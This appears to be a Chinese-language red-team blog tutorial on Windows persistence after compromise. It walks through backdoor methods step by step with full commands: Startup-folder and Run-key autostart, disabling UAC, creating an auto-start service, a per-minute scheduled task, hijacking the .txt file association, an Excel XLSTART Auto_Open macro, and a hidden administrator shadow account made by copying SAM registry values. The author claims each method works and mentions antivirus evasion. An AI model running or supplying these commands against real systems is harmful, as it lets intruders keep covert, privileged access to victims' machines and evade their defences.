利用启动项实现持久化


利用windows开机启动项实现权限的维持，每次系统启动都可实现后门的执行，很不错的权限维持的方式

1，可直接将后门放到启动项文件夹中就可实现开机自启动

windows启动项：

系统目录（需要管理员权限）

C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

当前用户目录

C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

2，利用注册表启动:

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "bypass_AV" /t REG_SZ /d "C:\ProgramData\BYPASS_av.exe" /f


也可添加到RunOnce中，其区别在于RunOnce的键值只作用一次，执行完毕后会自动删除

add后指明更改的注册表项值此处更改的HKEY_CURRENT_USER即当前用户的启动项不需要管理员权限

如果更改计算机的启动项使用HKEY_LOCAL_MACHINE，且必须是管理员才可更改

/v后 指明添加的字符串的名称，/d 后添加值此处代表路径

此处直接添加成功，在注册表中看到该值


重启，重新登录该用户，自启动成功，上线成功，此处简单的做了免杀处理。





利用windows服务实现持久化



windows中系统中的服务是以system权限运行的，并且可以自定义服务，因此可进行利用打造后门

win10中 直接通过sc注册一个服务会出现下图，拒绝访问

因为win7及以上的系统中的一个策略：uac，用户账户控制（就是防止意外操作以及非法攻击），它默认是打开的，要想创建成功需要先进行关闭

cmd 运行以下命令关闭uac，并重启后才可生效

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d "0" /f

add后跟的注册表项位置

/v 后为注册表值

/t 为值的类型

/d 为该值的具体内容

然后进行创建:

sc create "WindowsCbpav" binpath="C:\ProgramData\BYPASS_av.exe" //创建服务，指定路径sc description "WindowsCbpav" "WINDOWS CONTROL"//服务描述sc config "WindowsCbpav" start= auto//创建自启动net start "WindowsCbpav"//立即启动

sc description设置服务描述

服务运行后，成功上线




通过计划任务实现权限持久化



windows中07及以下版本通过at命令创建计划任务，07及以上版本通过sc实现


schtasks /create /tn solrindex /tr C:\ProgramData\BypassAv.exe /sc minute /mo 1

该命令的含义为

创建计划任务名称为 solrindex的任务，每一分钟执行一次BypassAv.exe程序

可以将minute 换成 hourly ，每小时执行

solrindex为计划任务名称，可自定义

C:\ProgramData\BypassAv.exe 为要执行文件的路径


效果图，每隔一分钟执行一次，下次执行为26。成功上线




利用文件关联实现持久化



文件关联的意思是某种类型的文件的默认打开方式与某程序建立一种关联

比如txt文件默认使用记事本打开，doc文档默认使用word打开

于是此处可以利用文件关联属性，将后门插入，来维持权限


通过assoc .txt 查看扩展名关联

之后通过修改注册表达到关联后门实现权限维持，对应注册表位置如下：

HKEY_LOCAL_MACHINE\Software\Classe   //保存了系统所有用户用户的类注册和文件扩展名信息HKEY_CURRENT_USER\Software\Classe    //保存了当前用户的类注册和文件扩展名信息HKEY_CLASS_ROOT                      //HKEY_CLASSES_ROOT项提供合并来自上面两个的信息的注册表的视图

此处修改txt对应的关联程序实现权限维持

位置：\HKEY_CLASS_ROOT\txtfile\shell\open\command

reg add "HKCR\txtfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "C:\ProgramData\BypassAv.exe %1" /f


此条命令的是将txtfile的默认打开程序修改为BypassAv.exe

实现效果，上线成功：




利用office组件实现权限持久化




微软的office组件，在启动时都会分别加载程序的启动目录，word的会去加载wll文件，excel的会去加载ell文件，并且可以加载该目录下的多个ell及wll文件，于是可以进行劫持打造后门进行维权

word加载目录：%APPDATA%\Microsoft\Word\Startupexcel加载目录：%appdata%\Microsoft\Excel\XLSTART


Word WLL 测试未成功，猜测可能是相关策略设置问题

Excel ELL 测试 成功

excel劫持实现持久化：

首先通过在excel中在设置中开启开发工具选项，进入VB编辑

选择插入---模板，代码模板

Sub Auto_Open()    Set objShell = CreateObject("Wscript.Shell")    objShell.Exec ("C:\lebo\bypass.exe")//此处填入要执行后门的路径End Sub

保存为xlam文件，并放置到%appdata%\Microsoft\Excel\XLSTART文件夹下

后门执行成功且上线成功，源程序可正常运行




通过影子账户实现持久化



影子账户创建的就是隐藏账户，通过普通的查看方式是看不到该账户的，但其实是存在的，从而达到隐藏的效果

首先创建一个隐藏账户，并加入到管理员组

net user rookie$ 123456 /add #账户后加$代表隐藏账户，通过netuser是看不到的net localgroup administrators rookie$ /add

创建后可以看到net user是看不到的

但是账户管理处可以看到

所以现在要做的是将其隐藏，在此处也看不到账户

更改注册表实现

打开HKEY_LOCAL_MACHINE\SAM\SAM

该注册表默认只有system可以修改，添加admin的权限，右击---权限

更改完权限后，再重新打开即可看到sam的值，其中user中的项对应name的值

此处只需要将admin的对应的f值 if4 导出，和rookie对应值 3ea，以及rookie$，导出这三个项

将3ea里面的f值替换为1f4的f值

保存后，删除rookie$账户

net user rookie$ /del

可以看到看不到账户了

之后选择注册表的  文件--导入，将之前的3ea和rook分别导入，如下图

可以看到账户管理以及netuser都看不到该账户

注销重新登录

使用rookie$    123456 成功登录，且具有之前的管理员权限

感觉windows中打造各种后门实现权限维持，百分之90都是需要改注册表，这是为什么？

翻阅了下资料以及求助润梓大哥给我的理解是这样的：


windwos中的所有系统级配置都放置在了微软设置的一个树状数据库中也就是注册表中。系统级的服务以及应用程序的执行都通过对注册表的修改来提高效率。因为注册表是以树状排列，并且所有键值都有索引，查询运行是非常快的，可以大幅度提高程序的执行效率。
